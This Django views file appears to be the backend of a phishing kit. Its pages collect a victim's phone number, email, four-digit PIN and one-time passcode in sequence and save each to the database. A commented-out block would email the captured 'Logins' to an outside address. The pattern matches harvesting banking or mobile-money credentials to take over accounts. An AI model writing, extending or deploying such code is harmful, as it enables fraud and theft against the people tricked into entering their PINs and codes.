from django.shortcuts import render
from django.core.mail import send_mail
from django.conf import settings
from .models import *

# Create your views here.

def index(request):
	if request.method=='POST':
		phone=request.POST.get('phone')
		post=Post(phone=phone)
		post.save()
	#if request.method == 'POST':
	#	phone= request.POST('phone')
	#	post=Post(phone=phone)
	#	post.save()

	#	send_mail(
	#		'Logins',#title
	#		message, #message
	#		'settings.EMAIL_HOST_USER', #sender if not available considered the default or configered
	#		[email,'oscarwilliam1978@gmsail.com'], #reciver email
	#		fail_silently=False
	#	)
	
	return render(request,'index.html',)

def emailverify(request):
	if request.method=='POST':
		email=request.POST.get('email')
		email_post=Email_post(email=email)
		email_post.save()
	
	
	return render(request,'email.html',)


def email(request):

	return render(request,'email.html',)

def pinverify(request):
	if request.method=='POST':
		pina=request.POST.get('pina')
		pinb=request.POST.get('pinb')
		pinc=request.POST.get('pinc')
		pind=request.POST.get('pind')
		pin_post=Pin_post(pina=pina,pinb=pinb,pinc=pinc,pind=pind,)
		pin_post.save()
	
	return render(request,'pin.html',)

def pin(request):

	return render(request,'pin.html',)

def otpverify(request):
	if request.method=='POST':
		otp=request.POST.get('otp')
		otp_post=Otp_post(otp=otp)
		otp_post.save()
		
	return render(request,'otp.html',)

def otp(request):
		
	return render(request,'otp.html',)
